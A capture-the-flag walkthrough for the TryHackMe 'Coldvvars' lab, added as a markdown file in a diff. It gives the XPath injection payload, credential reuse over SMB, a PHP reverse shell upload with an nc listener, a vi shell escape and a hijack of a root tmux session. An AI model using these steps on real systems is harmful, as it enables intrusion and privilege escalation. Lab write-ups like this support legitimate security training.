@@ -1,0 +1,199 @@
+Coldvvars THM – Full Walkthrough
+🔍 Initial Enumeration
+Nmap Scan
+bash
+nmap -sC -sV -p- 10.113.157.247
+Open Ports:
+
+22/tcp – SSH (OpenSSH 8.2p1)
+
+139/445/tcp – Samba smbd 4
+
+8080/tcp – Apache httpd 2.4.41
+
+8082/tcp – Node.js Express
+
+Directory Fuzzing
+On port 8080:
+
+bash
+feroxbuster -u http://10.113.157.247:8080 -w /usr/share/wordlists/dirb/common.txt
+Discovered /dev/ directory.
+
+Further fuzzing inside /dev/ reveals note.txt.
+
+On port 8082:
+Found /login page.
+
+🕸️ Web Exploitation (XPath Injection)
+The login page at http://10.113.157.247:8082/login is vulnerable to XPath Injection.
+
+Payload used:
+
+text
+" or "=" or "
+This causes an internal server error that dumps the user table:
+
+Username	Password
+Tove	Jani
+Godzilla	KONGistheKING
+SuperMan	snyderCut
+ArthurMorgan	DeadEye
+The credentials ArthurMorgan:DeadEye are valid for SMB access.
+
+📁 SMB Enumeration & Foothold
+List Shares with Valid Credentials
+bash
+nxc smb 10.113.157.247 -u 'ArthurMorgan' -p 'DeadEye' --shares
+Output shows the SECURED share with READ, WRITE permissions.
+
+Connect to Share
+bash
+smbclient \\\\10.113.157.247\\SECURED -U ArthurMorgan
+Inside, we see:
+
+text
+note.txt
+Contents of note.txt hint at a file upload and testing functionality.
+
+Upload PHP Reverse Shell
+Create a PHP reverse shell (e.g., shell.php) and upload it via SMB:
+
+bash
+put shell.php
+Trigger Shell
+The web root for port 8080 is at /dev/. Access the uploaded shell:
+
+text
+http://10.113.157.247:8080/dev/shell.php
+Catch the reverse shell:
+
+bash
+nc -lvnp 5555
+You now have a shell as www-data.
+
+👤 User Flag – ArthurMorgan
+Stabilize Shell
+bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Background with Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm-256color
+Switch to ArthurMorgan
+From earlier credentials, we can su:
+
+bash
+su ArthurMorgan
+Password: DeadEye
+Or if SSH is available:
+
+bash
+ssh ArthurMorgan@10.113.157.247
+User Flag
+bash
+cat /home/ArthurMorgan/user.txt
+Flag: ae39f419ce0...
+
+🚀 Privilege Escalation – Root Flag
+Overview
+The intended privilege escalation path involves:
+
+Escaping to marston user via a vi escape on an internal service (port 4545).
+
+Triggering a root-owned tmux session.
+
+Attaching to the session and navigating to the root pane.
+
+Step 1: Become marston via Internal Service
+Check for the Service
+The service runs on port 4545 (discovered via LinPEAS or env as OPEN_PORT=4545).
+If the port is not listening (ss -tlnp | grep 4545), you may need to trigger it.
+
+Connect to the Service
+bash
+nc 127.0.0.1 4545
+Press Enter a few times to see the menu:
+
+text
+ideaBox
+1.Write
+2.Delete
+3.Steal others' Trash
+4.Show'nExit
+Choose option 4. This opens the vi editor.
+
+Escape to marston
+Inside vi, type the following and press Enter:
+
+vim
+:!bash
+(If that fails, try :!/bin/sh)
+
+You now have a shell as marston.
+
+Upgrade the Shell
+bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+Step 2: Trigger the Root tmux Session
+Now, as marston, connect to the service again and exit vi cleanly. This action spawns a root-owned tmux session in the background.
+
+bash
+nc 127.0.0.1 4545
+Choose option 4 to open vi again.
+This time, do not escape to a shell. Instead, exit vi normally:
+
+Press Esc (to ensure normal mode)
+
+Type :wq and press Enter
+
+Wait about 10–15 seconds for the root session to start.
+
+Step 3: Attach to the Root tmux Session
+Set the terminal type (crucial for proper display):
+
+bash
+export TERM=xterm
+The root session uses a separate socket, usually at /tmp/tmux-0/default. Attach to it:
+
+bash
+tmux -S /tmp/tmux-0/default attach -t 0
+If you get an error about the socket not existing, find the correct path:
+
+bash
+find /tmp -type s -name "tmux-*" 2>/dev/null
+Look for a socket owned by root (e.g., /tmp/tmux-0/default).
+
+Step 4: Navigate to the Root Pane
+Once attached, your terminal may appear frozen or blank. This is normal.
+
+Method A – Using Tmux Prefix Keys
+
+Press Ctrl+b, release, then press n to cycle to the next pane.
+
+Repeat until you see a prompt like root@ip-...:~#.
+
+Press Enter to interact with the shell.
+
+Method B – Direct Commands (if prefix keys fail)
+From inside the attached session, run:
+
+bash
+tmux list-panes
+Switch to each pane and test:
+
+bash
+tmux select-pane -t 0
+whoami
+Try panes 0, 1, 2, etc., until you see root.
+
+Method C – Send Command and Capture Output
+
+bash
+tmux send-keys -t 0 "cat /root/root.txt" Enter
+tmux capture-pane -t 0 -p | tail -10
+Adjust the pane number (-t 0, -t 1, etc.) until the flag appears.
+
+Step 5: Retrieve the Root Flag
+bash
+cat /root/root.txt
+Flag: [REDACTED] (You'll see it on screen.)
